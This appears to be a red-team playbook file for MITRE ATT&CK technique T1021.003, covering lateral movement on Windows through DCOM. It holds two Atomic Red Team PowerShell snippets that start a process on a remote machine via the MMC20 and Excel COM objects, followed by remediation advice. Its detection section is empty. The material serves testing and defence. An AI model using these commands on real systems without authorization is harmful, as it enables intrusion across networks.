---
name: "T1021.003_distributed-component-object-model"
description: "Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM)."
category: "authorization"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1021.003
  - lateral-movement
  - windows
  - sub-technique
technique_id: "T1021.003"
tactic: "lateral-movement"
all_tactics:
  - lateral-movement
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1021/003"
tech_stack:
  - windows
cwe_ids:
  - CWE-284
chains_with:
  - T1021
  - T1021.001
  - T1021.002
  - T1021.004
  - T1021.005
  - T1021.006
  - T1021.007
  - T1021.008
prerequisites:
  - T1021
severity_boost:
  T1021: "Chain with T1021 for deeper attack path"
  T1021.001: "Chain with T1021.001 for deeper attack path"
  T1021.002: "Chain with T1021.002 for deeper attack path"
---

# T1021.003 Distributed Component Object Model

> **Sub-technique of:** T1021

## High-Level Description

Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.

The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.

Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.

Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with Windows Management Instrumentation.

## Kill Chain Phase

- Lateral Movement (TA0008)

**Platforms:** Windows

## What to Check

- [ ] Identify if Distributed Component Object Model technique is applicable to target environment
- [ ] Check Windows systems for indicators of Distributed Component Object Model
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: PowerShell Lateral Movement using MMC20

Powershell lateral movement using the mmc20 application com object.

Reference:

https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/

Upon successful execution, cmd will spawn calc.exe on a remote computer.

**Supported Platforms:** windows

```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
```

### Atomic Test 2: PowerShell Lateral Movement Using Excel Application Object

Powershell lateral movement using the Excel COM objects.

Reference:

https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922

Upon successful execution, cmd will spawn calc.exe on a remote computer.

**Supported Platforms:** windows

```powershell
copy c:\windows\system32\calc.exe 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","#{computer_name}"))
$com.ActivateMicrosoftApp("5")
```

**Dependencies:**

- Microsoft Excel must be installed

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Distributed Component Object Model by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1021.003 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1042 Disable or Remove Feature or Program

Consider disabling DCOM through Dcomcnfg.exe.

### M1048 Application Isolation and Sandboxing

Ensure all COM alerts and Protected View are enabled.

### M1030 Network Segmentation

Enable Windows firewall, which prevents DCOM instantiation by default.

### M1026 Privileged Account Management

Modify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID\{{AppID_GUID}}` associated with the process-wide security of individual COM applications.

Modify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole` associated with system-wide security defaults for all COM applications that do not set their own process-wide security.

## Detection

### Multi-Event Behavioral Detection for DCOM-Based Remote Code Execution

## Risk Assessment

| Finding                                                 | Severity | Impact           |
| ------------------------------------------------------- | -------- | ---------------- |
| Distributed Component Object Model technique applicable | High     | Lateral Movement |

## CWE Categories

| CWE ID  | Title                   |
| ------- | ----------------------- |
| CWE-284 | Improper Access Control |

## References

- [Fireeye Hunting COM June 2019](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)
- [Microsoft COM](https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx)
- [Microsoft COM ACL](https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1)
- [Microsoft Process Wide Com Keys](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx>)
- [MSDN WMI](https://msdn.microsoft.com/en-us/library/aa394582.aspx)
- [Enigma DCOM Lateral Movement Jan 2017](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [Enigma MMC20 COM Jan 2017](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [Enigma Outlook DCOM Lateral Movement Nov 2017](https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/)
- [Enigma Excel DCOM Sept 2017](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)
- [Cyberreason DCOM DDE Lateral Movement Nov 2017](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [Atomic Red Team - T1021.003](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1021.003)
- [MITRE ATT&CK - T1021.003](https://attack.mitre.org/techniques/T1021/003)
